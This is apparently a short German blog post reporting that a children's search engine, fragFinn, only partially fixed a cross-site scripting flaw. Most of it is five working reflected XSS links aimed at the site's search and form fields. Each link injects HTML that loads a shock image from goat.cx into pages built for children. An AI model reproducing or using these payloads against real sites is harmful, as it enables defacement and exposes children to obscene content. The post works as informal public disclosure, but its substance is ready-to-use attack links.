<html><body><p>Wie <a href="http://www.die-welt.net/index.php/blog/203/Frau_Merkel_fragt_Finn%2C_ob_er_Goatse_mag">am Donnerstag berichtet</a>, wollte ich wissen, ob <a href="http://www.fragfinn.de" target="_blank">Finn</a> Goatse mag. Offensichtlich nicht, denn das Loch in der Suche wurde gefixt. Naja, gefixt ist das falsche Wort, würgaraundet eher:<br>

<br>

<a href="http://www.fragfinn.de/kinderliste/suche.html?ql=&amp;zip=%22%3E%3Ch1%3ELeider%20immer%20noch%3C/h1%3E%3Cimg%20src=%22http://goat.cx/pump.jpg%22%3E&amp;submitted=Abschicken" target="_blank">XSS in der erweiterten Suche nach Region (PLZ-Feld)</a><br>

<a href="http://www.fragfinn.de/kinderliste/eltern/kontakt.html?name=%22%3E%3Cimg%20src=%22http://goat.cx/pump.jpg%22%3E" target="_blank">XSS im Kontaktformular (Namens-Feld)</a><br>

<a href="http://www.fragfinn.de/kinderliste/eltern/kontakt.html?email=%22%3E%3Cimg%20src=%22http://goat.cx/pump.jpg%22%3E" target="_blank">XSS im Kontaktformular (EMail-Feld)</a><br>

<a href="http://www.fragfinn.de/kinderliste/tools/alarm.html?name=%22%3E%3Cimg%20src=%22http://goat.cx/pump.jpg%22%3E" target="_blank">XSS im Alarmformular (Namens-Feld)</a><br>

<a href="http://www.fragfinn.de/kinderliste/tools/alarm.html?email=%22%3E%3Cimg%20src=%22http://goat.cx/pump.jpg%22%3E" target="_blank">XSS im Alarmformular (EMail-Feld)</a><br>

<br>

Und das ist erst der Anfang, aber ich habe gerade keine Lust weiter zu forschen... Gute Nacht.</p></body></html>